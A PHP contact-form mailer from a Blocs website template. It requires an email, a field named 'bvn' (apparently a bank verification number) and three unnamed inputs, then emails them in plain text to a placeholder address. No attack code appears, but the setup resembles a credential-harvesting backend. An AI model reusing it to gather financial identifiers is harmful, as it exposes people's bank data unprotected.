<?php	
	if(empty($_POST['email_10331_549']) && strlen($_POST['email_10331_549']) == 0 || empty($_POST['bvn_10331_549']) && strlen($_POST['bvn_10331_549']) == 0 || empty($_POST['input_2588_549']) && strlen($_POST['input_2588_549']) == 0 || empty($_POST['input_1691_549']) && strlen($_POST['input_1691_549']) == 0 || empty($_POST['input_1313_549']) && strlen($_POST['input_1313_549']) == 0)
	{
		return false;
	}
	
	$email_10331_549 = $_POST['email_10331_549'];
	$bvn_10331_549 = $_POST['bvn_10331_549'];
	$input_2588_549 = $_POST['input_2588_549'];
	$input_1691_549 = $_POST['input_1691_549'];
	$input_1313_549 = $_POST['input_1313_549'];
	
	$to = 'receiver@yoursite.com'; // Email submissions are sent to this email

	// Create email	
	$email_subject = "Message from a Blocs website.";
	$email_body = "You have received a new message. \n\n".
				  "Email_10331_549: $email_10331_549 \nBvn_10331_549: $bvn_10331_549 \nInput_2588_549: $input_2588_549 \nInput_1691_549: $input_1691_549 \nInput_1313_549: $input_1313_549 \n";
	$headers = "MIME-Version: 1.0\r\nContent-type: text/plain; charset=UTF-8\r\n";	
	$headers .= "From: contact@yoursite.com\n";
	$headers .= "Reply-To: DoNotReply@yoursite.com";	
	
	mail($to,$email_subject,$email_body,$headers); // Post message
	return true;			
?>